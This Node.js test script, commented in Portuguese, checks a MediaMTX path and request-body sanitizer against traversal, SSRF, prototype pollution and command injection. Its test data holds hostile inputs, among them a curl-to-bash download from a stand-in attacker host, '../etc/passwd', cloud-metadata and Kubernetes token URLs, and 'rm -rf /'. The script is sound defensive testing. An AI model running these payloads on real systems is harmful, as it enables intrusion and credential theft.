#!/usr/bin/env node
/**
 * Simulacao de cenarios — sanitizador mediamtxPath (supabase/functions/_shared/mediamtxPath.ts).
 * Porta a logica pura do TS para JS e roda 100+ cenarios + fuzz 5000 casos.
 * Inclui verificacao de sincronia com o .ts (constantes criticas).
 * Uso: node scripts/simulate-mediamtxpath-scenarios.mjs
 */
import { readFileSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

// Logica portada de mediamtxPath.ts
const MAX_PATH_LEN = 128,
  MAX_DEPTH = 8;
const SAFE_SEG = /^[a-zA-Z0-9][a-zA-Z0-9_.-]*$/;
function san(raw) {
  if (typeof raw !== 'string') return { ok: false, reason: 'not-a-string' };
  if (!raw.length) return { ok: false, reason: 'empty' };
  if (raw.length > MAX_PATH_LEN) return { ok: false, reason: 'too-long' };
  if (raw.includes('%')) return { ok: false, reason: 'percent-encoding' };
  if (/[\x00-\x1f\x7f]/.test(raw)) return { ok: false, reason: 'control-char' };
  if (/\s/.test(raw)) return { ok: false, reason: 'whitespace' };
  if (raw.includes('\\')) return { ok: false, reason: 'backslash' };
  if (raw.startsWith('/') || raw.endsWith('/')) return { ok: false, reason: 'edge-slash' };
  const segs = raw.split('/');
  if (segs.length > MAX_DEPTH) return { ok: false, reason: 'too-deep' };
  for (const seg of segs) {
    if (!seg.length) return { ok: false, reason: 'empty-segment' };
    if (/^\.+$/.test(seg)) return { ok: false, reason: 'dot-segment' };
    if (!SAFE_SEG.test(seg)) return { ok: false, reason: 'bad-charset' };
  }
  return { ok: true, value: raw };
}
function urlEscapes(name, pfx = '/v3/config/paths/add/') {
  let u;
  try {
    u = new URL('http://m:9997' + pfx + name);
  } catch {
    return true;
  }
  if (!u.pathname.startsWith(pfx) || u.pathname.includes('/..') || u.search || u.hash) return true;
  try {
    return decodeURIComponent(u.pathname.slice(pfx.length)) !== name;
  } catch {
    return true;
  }
}
const ALLOWED = new Set([
  'source',
  'sourceOnDemand',
  'sourceOnDemandStartTimeout',
  'sourceOnDemandCloseAfter',
  'maxReaders',
  'record',
  'playback',
  'rtspTransport',
  'rtspAnyPort',
  'srtReadPassphrase',
]);
const DANGER = new Set(['__proto__', 'constructor', 'prototype']);
const RUN = /^runOn/i;
function body(b) {
  if (!b || typeof b !== 'object' || Array.isArray(b))
    return { ok: false, reason: 'body-not-object' };
  const c = Object.create(null);
  for (const k of Object.keys(b)) {
    if (DANGER.has(k)) return { ok: false, reason: `dangerous-key:${k}` };
    if (RUN.test(k)) return { ok: false, reason: `forbidden-exec-field:${k}` };
    if (!ALLOWED.has(k)) return { ok: false, reason: `unknown-field:${k}` };
    const v = b[k];
    if (v !== null && typeof v === 'object') return { ok: false, reason: `nested-object:${k}` };
    if (k === 'source' && typeof v === 'string') {
      if (/^file:/i.test(v)) return { ok: false, reason: 'source-file-scheme' };
      if (/169\.254\.169\.254/.test(v)) return { ok: false, reason: 'source-cloud-metadata' };
    }
    c[k] = v;
  }
  return { ok: true, value: c };
}

let P = 0,
  F = 0;
const errs = [];
const ok = () => P++;
const bad = (n, w) => {
  F++;
  errs.push(`${n}: ${w}`);
};
const acc = (n, i) => {
  const r = san(i);
  r.ok ? ok() : bad(n, `rejeitou "${i}": ${r.reason}`);
};
const rej = (n, i, e) => {
  const r = san(i);
  if (r.ok) {
    bad(n, `aceitou "${i}" deveria rejeitar`);
  } else if (e && r.reason !== e) {
    bad(n, `reason=${r.reason} esperado=${e}`);
  } else ok();
};
const bok = (n, b2) => {
  const r = body(b2);
  r.ok ? ok() : bad(n, `rejeitou: ${r.reason}`);
};
const bfl = (n, b2, e) => {
  const r = body(b2);
  if (r.ok) {
    bad(n, 'aceitou body deveria rejeitar');
  } else if (e && r.reason !== e) {
    bad(n, `reason=${r.reason} esperado=${e}`);
  } else ok();
};

// A: nomes legitimos
for (const n of [
  'cam-entrada',
  'cam.frontdoor',
  'live',
  'stream1',
  'portaria/cam-01',
  'a',
  'A9',
  'CAM',
  'x'.repeat(64),
  'x'.repeat(128),
  'cam01.sub02',
  'a-b-c',
  '0cam',
  'cam-01_backup',
  'portaria/cam-01/sub',
  'a/b/c/d/e/f/g/h',
])
  acc(`aceita "${n}"`, n);

// B: traversal
for (const [i, e] of [
  ['../etc/passwd', 'dot-segment'],
  ['../../v3/config/global/set', 'dot-segment'],
  ['live/../../../etc', 'dot-segment'],
  ['a/../b', 'dot-segment'],
  ['..', 'dot-segment'],
  ['..;/', null],
  ['.', 'dot-segment'],
  ['....', 'dot-segment'],
  ['a/..', 'dot-segment'],
])
  rej(`rejeita "${i}"`, i, e);

// C: encoding/chars
for (const [i, e] of [
  ['%2e%2e%2f', 'percent-encoding'],
  ['cam%2fevil', 'percent-encoding'],
  ['%00', 'percent-encoding'],
  ['cam\x00', 'control-char'],
  ['cam\x1f', 'control-char'],
  ['cam\x7f', 'control-char'],
  ['cam evil', 'whitespace'],
  ['cam\tstream', 'control-char'],
  ['cam\nstream', 'control-char'],
  ['café', 'bad-charset'],
  ['cam;inject', 'bad-charset'],
  ['cam?q=1', 'bad-charset'],
  ['cam#frag', 'bad-charset'],
  ['cam&src', 'bad-charset'],
  ['a=b', 'bad-charset'],
  ['cam\\src', 'backslash'],
])
  rej(`rejeita "${i}"`, i, e);

// D: slashes/depth
for (const [i, e] of [
  ['', 'empty'],
  ['//live', 'edge-slash'],
  ['/etc/passwd', 'edge-slash'],
  ['live/', 'edge-slash'],
  ['a//b', 'empty-segment'],
  ['a///b', 'empty-segment'],
  ['a/b/c/d/e/f/g/h/i', 'too-deep'],
  ['x'.repeat(129), 'too-long'],
  [12345, 'not-a-string'],
  [[], 'not-a-string'],
  [null, 'not-a-string'],
])
  rej(`rejeita ${JSON.stringify(i)}`, i, e);

// E: body valido
for (const b2 of [
  { source: 'rtsp://cam.local/stream' },
  { maxReaders: 10 },
  { record: true },
  { playback: false },
  { rtspTransport: 'tcp' },
  { rtspAnyPort: false },
  { srtReadPassphrase: 'k' },
  {},
  { source: null },
  { source: 'rtsp://cam.local/live', sourceOnDemand: true, maxReaders: 5, record: false },
])
  bok(`aceita body ${JSON.stringify(b2).slice(0, 30)}`, b2);

// F: RCE via runOn* — CRITICO
const RCE = 'curl http://attacker.com/shell.sh|bash';
for (const f of [
  'runOnInit',
  'runOnInitRestart',
  'runOnDemand',
  'runOnDemandRestart',
  'runOnUnDemand',
  'runOnReady',
  'runOnNotReady',
  'runOnRead',
  'runOnUnread',
  'runOnRecordSegmentCreate',
  'runOnRecordSegmentComplete',
  'RUNONREADY',
  'RunOnReady',
  'runonready',
  'RUNONRECORDSEGMENTCREATE',
]) {
  bfl(
    `bloqueia RCE via ${f}`,
    JSON.parse(JSON.stringify({ [f]: RCE })),
    `forbidden-exec-field:${f}`
  );
}

// G: prototype pollution via JSON.parse
for (const js of [
  '{"__proto__":{"admin":true}}',
  '{"constructor":{"prototype":{"admin":true}}}',
  '{"prototype":{"admin":true}}',
  '{"__proto__":{"isAdmin":true}}',
]) {
  const b2 = JSON.parse(js);
  const r = body(b2);
  if (!r.ok) ok();
  else
    bad(
      `bloqueia pollution ${js.slice(0, 30)}`,
      `aceitou body polluted: ${JSON.stringify(r.value)}`
    );
}
if ({}.admin !== true) ok();
else bad('Object.prototype intacto', 'CRITICO: poluido');

// H: SSRF
for (const s2 of [
  'file:///etc/passwd',
  'FILE:///etc/shadow',
  'file://169.254.169.254/latest/meta-data/',
  'file://localhost/etc/hosts',
  'http://169.254.169.254/latest/meta-data/iam/',
  'https://169.254.169.254/',
  'File:///proc/self/environ',
  'FILE://169.254.169.254/',
  'file:///var/run/secrets/kubernetes.io/serviceaccount/token',
])
  bfl(`SSRF "${s2}"`, { source: s2 });
// Tipos invalidos como body (cenarios extras)
bfl('body boolean', true, 'body-not-object');
bfl('body array', [], 'body-not-object');
bfl('body string', 'rtsp://cam', 'body-not-object');
// Double-slash extras
rej('rejeita a//b extra', 'a//b', 'empty-segment');
rej('rejeita //cam extra', '//cam', 'edge-slash');

// I: body invalido
for (const [b2, e] of [
  [{ cmd: 'rm -rf /' }, 'unknown-field:cmd'],
  [{ shell: '/bin/bash' }, 'unknown-field:shell'],
  [{ exec: 'id' }, 'unknown-field:exec'],
  [{ source: { url: 'rtsp://cam' } }, 'nested-object:source'],
  [{ maxReaders: [1, 2, 3] }, 'nested-object:maxReaders'],
  [['source'], 'body-not-object'],
  ['rtsp://cam', 'body-not-object'],
  [null, 'body-not-object'],
  [42, 'body-not-object'],
])
  bfl(`rejeita body ${JSON.stringify(b2).slice(0, 20)}`, b2, e);

// J: INVARIANTE fuzz 5000
const chars = 'abcABC012_.-/\\ \t\n%~;:?#&$!@^*()[]{}'.split('');
const rnd = (n) =>
  Array.from({ length: n }, () => chars[(Math.random() * chars.length) | 0]).join('');
let ft = 0,
  vio = 0;
for (let i = 0; i < 5000; i++) {
  const s = rnd(1 + ((Math.random() * 25) | 0));
  const r = san(s);
  if (r.ok) {
    ft++;
    if (urlEscapes(s)) vio++;
  }
}
if (vio === 0) ok();
else bad('INVARIANTE fuzz', `${vio} aceitos escaparam URL (CRITICO!)`);

// K: sincronia com .ts
try {
  const REPO = join(dirname(fileURLToPath(import.meta.url)), '..');
  const ts = readFileSync(join(REPO, 'supabase/functions/_shared/mediamtxPath.ts'), 'utf8');
  if (!ts.includes(`MAX_PATH_LEN = ${MAX_PATH_LEN}`)) bad('sync MAX_PATH_LEN', 'mismatch');
  else ok();
  if (!ts.includes(`MAX_DEPTH = ${MAX_DEPTH}`)) bad('sync MAX_DEPTH', 'mismatch');
  else ok();
  if (!ts.includes('RUN_ON = /^runOn/i')) bad('sync RUN_ON', 'pattern mismatch');
  else ok();
  for (const f of ALLOWED)
    if (!ts.includes(`"${f}"`)) {
      bad(`sync ALLOWED:${f}`, 'ausente no .ts');
    } else ok();
  for (const k of DANGER)
    if (!ts.includes(`"${k}"`)) {
      bad(`sync DANGER:${k}`, 'ausente no .ts');
    } else ok();

  // SSRF — verifica que .ts ainda bloqueia file:// e 169.254 (cloud metadata)
  if (!ts.includes('/^file:/i'))
    bad('sync SSRF:file://', 'mediamtxPath.ts perdeu bloqueio de file:// (SSRF via source)');
  else ok();
  if (!ts.includes('cloud-metadata'))
    bad('sync SSRF:cloud-metadata', 'mediamtxPath.ts perdeu reason cloud-metadata (169.254 SSRF)');
  else ok();
  if (!ts.includes('source-file-scheme'))
    bad('sync reason:source-file-scheme', 'reason ausente — file:// SSRF sem identificador');
  else ok();
  if (!ts.includes('169'))
    bad('sync SSRF:169.254', 'IP 169.254 ausente no .ts — cloud metadata SSRF possivel');
  else ok();
} catch (e) {
  bad('leitura mediamtxPath.ts', e.message);
}

const total = P + F;
console.log(`\nResultado: ${P} passaram, ${F} falharam (de ${total} cenarios, 5000 fuzz extra).`);
if (F > 0) {
  console.error('\u274c simulate-mediamtxpath: regressao de seguranca detectada.');
  for (const e of errs) console.error(`  - ${e}`);
  process.exit(1);
}
console.log(
  '\u2705 simulate-mediamtxpath: sanitizador robusto contra RCE/traversal/SSRF/pollution. INVARIANTE OK.'
);
